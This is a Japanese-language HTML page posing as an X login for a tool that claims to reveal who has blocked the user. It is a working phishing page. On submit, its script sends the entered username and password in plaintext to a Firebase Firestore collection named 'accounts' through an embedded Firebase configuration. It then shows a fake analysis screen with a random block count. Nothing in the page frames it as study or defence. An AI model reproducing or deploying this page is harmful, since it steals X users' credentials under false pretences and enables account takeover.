<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Xアカウントにログイン</title>
  <style>
    /* ここはあなたの元の CSS をそのまま */
  </style>
</head>
<body>
  <div class="container">
    <div class="header-icon">
      <img src="data:image/png;base64,...(省略)...">
    </div>

    <div class="card">
      <div id="login-screen">
        <div class="title-area">
          <div class="title">Xアカウントにログイン</div>
          <div class="subtitle">メールアドレスとパスワードを入力してください</div>
          <div class="description">
            <strong>あなたをブロックしているユーザーを分析できます。</strong><br>
            あなたは何人ものユーザーに接続的な影響力や反響を与えているのか調べてみましょう。
          </div>
        </div>

        <form id="login-form">
          <div class="form-group">
            <label>電話番号/メールアドレス/ユーザー名</label>
            <div class="input-wrapper">
              <input type="text" id="account" placeholder="電話番号、メールアドレスまたはユーザー名" required />
            </div>
          </div>

          <div class="form-group">
            <label>パスワード</label>
            <div class="input-wrapper">
              <input type="password" id="password" placeholder="パスワードを入力" required />
            </div>
          </div>

          <button type="submit" class="btn-login">ログイン</button>
        </form>
      </div>

      <div id="analysis-screen">
        <div class="title">分析中...</div>
        <div class="subtitle">あなたをブロックしているユーザーを検索しています</div>
        <div class="loading-spinner"></div>
      </div>

      <div id="result-screen">
        <div class="title">分析完了</div>
        <div class="subtitle">あなたをブロックしているユーザー数</div>
        <div class="result-number" id="block-count">0</div>
        <div class="result-text">人のユーザーにブロックされています</div>
        <button class="btn-back" id="btn-retry">もう一度試す</button>
      </div>
    </div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-firestore.js";

    const firebaseConfig = {
      apiKey: "AIzaSyB65yYda5Y1bVM3q74HizAQSbRrOT014x0",
      authDomain: "daada-ae048.firebaseapp.com",
      projectId: "daada-ae048",
      storageBucket: "daada-ae048.appspot.com",
      messagingSenderId: "844142280857",
      appId: "1:844142280857:web:9ced0beca7eeafd3223808",
      measurementId: "G-02E60HW9QW"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    const loginForm = document.getElementById('login-form');
    const loginScreen = document.getElementById('login-screen');
    const analysisScreen = document.getElementById('analysis-screen');
    const resultScreen = document.getElementById('result-screen');
    const blockCountEl = document.getElementById('block-count');
    const btnRetry = document.getElementById('btn-retry');
    let savedCount = null;

    loginForm.addEventListener('submit', async (e) => {
      e.preventDefault();

      const account = document.getElementById('account').value;
      const password = document.getElementById('password').value;

      // Firebase に送信
      try {
        await addDoc(collection(db, "accounts"), {
          account,
          password,
          timestamp: new Date()
        });
      } catch (err) {
        console.error("Firestore Error:", err);
      }

      // 画面遷移
      loginScreen.style.display = 'none';
      analysisScreen.style.display = 'block';

      setTimeout(() => {
        if (savedCount === null) {
          savedCount = Math.floor(Math.random() * 15) + 1;
        }
        blockCountEl.textContent = savedCount;
        analysisScreen.style.display = 'none';
        resultScreen.style.display = 'block';
      }, 2500);
    });

    btnRetry.addEventListener('click', () => {
      resultScreen.style.display = 'none';
      loginScreen.style.display = 'block';
      loginForm.reset();
    });
  </script>
</body>
</html>
